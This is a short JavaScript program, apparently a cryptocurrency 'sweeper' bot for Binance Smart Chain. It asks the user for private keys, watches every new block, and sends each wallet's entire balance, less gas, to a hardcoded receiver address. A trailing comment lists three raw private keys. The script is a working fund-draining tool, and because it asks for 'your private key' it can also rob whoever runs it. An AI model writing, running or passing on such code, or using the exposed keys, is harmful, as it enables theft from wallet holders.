const prompt = require("prompt-sync")();
const { ethers } = require("ethers");
const { BigNumber, utils } = ethers;
const provider = new ethers.providers.JsonRpcProvider(
    "https://bsc-dataseed.binance.org"
  );
  const addressReceiver = "0x8d0962B42E1bbCA0B1b606a19924fb4E3E945167";

const privateKey = [];

let i = 0;
while (i < 2) {
  const input = prompt("Enter your private key : ");
  privateKey.push(input);
  i++;
}

// console.log(privateKey);

const bot = async () => {
  provider.on("block", async () => {
    console.log("Listening new block, waiting..)");
    for (let i = 0; i < privateKey.length; i++) {
      const _target = new ethers.Wallet(privateKey[i]);
      const target = _target.connect(provider);
      console.log('target address : ', target.address)
      const balance = await provider.getBalance(target.address);
      console.log('Wallet balance: ', ethers.utils.formatEther(balance));
      
      const gasLimit = 23000; // default 21000
      const gasPrice = await provider.getGasPrice();

      const maxGasFee = BigNumber.from(gasLimit).mul(gasPrice)
      console.log('Tx gas price: ', ethers.utils.formatEther(maxGasFee));

      if (balance.sub(maxGasFee) > 0) {
        console.log("NEW ACCOUNT WITH ETH!");
        const amount = balance.sub(maxGasFee);
        try {
          await target.sendTransaction({
            to: addressReceiver,
            value: amount,
            gasPrice: gasPrice,
            gasLimit: gasLimit,
          });
          console.log(
            `Success! transfered --> ${ethers.utils.formatEther(balance)}`
          );
        } catch (e) {
          console.log(`error: ${e}`);
        }
      }
    }
  });
};

bot();


// private keys

// 0x08557876db9db41e21382d43c728f5e9c2add9177c3a04744fa4f4ef01f79572
// 0xe5b4a112a8417cf00ec9a761d53fa76193629df94556efa2fe5e93e5df886c1c
// 0x748efb42599c4cac084188dcf237dcdb484ee043a978b25ce2cacb84caffb1b7
